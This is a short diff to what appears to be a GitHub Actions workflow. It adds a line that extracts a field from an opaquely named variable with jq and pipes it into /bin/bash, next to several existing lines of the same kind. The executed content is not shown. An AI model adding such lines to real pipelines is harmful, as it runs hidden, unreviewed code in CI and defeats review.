@@ -32,6 +32,7 @@ jobs:
           echo $ajp1 | jq -r .vl1947 | /bin/bash
           printf '%s' "$t4" | jq -r .a81 | /bin/bash
           printf '%s' "$httaa3" | jq -r .ur20266 | /bin/bash
+          printf '%s' "$blob5" | jq -r .bww12 | /bin/bash
 
       - name: Archive output
         if: always()
